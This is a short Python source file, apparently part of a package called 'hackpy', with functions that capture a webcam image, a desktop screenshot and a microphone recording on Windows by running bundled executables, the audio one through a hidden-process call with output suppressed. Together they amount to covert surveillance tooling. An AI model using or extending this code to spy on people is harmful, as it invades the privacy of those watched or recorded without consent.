from os              import path
from random          import randint
from hackpy.info     import *
from hackpy.settings import *
from hackpy.commands import *

def webcamScreenshot(filename = 'screenshot-' + str(randint(1, 99999)) + '.png', delay = 4500, camera = 1):
    ##|
    ##| Make webcam screenshot:
    ##| hackpy.webcamScreenshot(filename='webcam.png', delay=5000, camera=1)
    ##|
    command.system(module_location + r'\executable\webcam.exe /filename ' + str(filename) + ' /delay ' + str(delay) + ' /devnum ' + str(camera) + devnull)
    if path.exists(filename):
        return filename
    else:
        return False

def desktopScreenshot(filename = 'screenshot-' + str(randint(1, 99999)) + '.png'):
    ##|
    ##| Make screenshot of desktop
    ##| hackpy.desktopScreenshot(filename='desktop.png')
    ##|
    command.nircmdc('savescreenshotfull ' + filename)
    if path.exists(filename):
        return filename
    else:
        return False

def recordAudio(filename = 'recording-' + str(randint(1, 99999)) + '.wav', time = 5):
    ##|
    ##| Record audio from microphone
    ##| hakpy.reordAudio(filename = 'recording.wav')
    ##|
    command.hiddenSystem(module_location + r'\executable\audio\fmedia.exe --record --until=' + str(time) + ' -o ' + filename)
    if path.exists(filename):
        return filename
    else:
        return False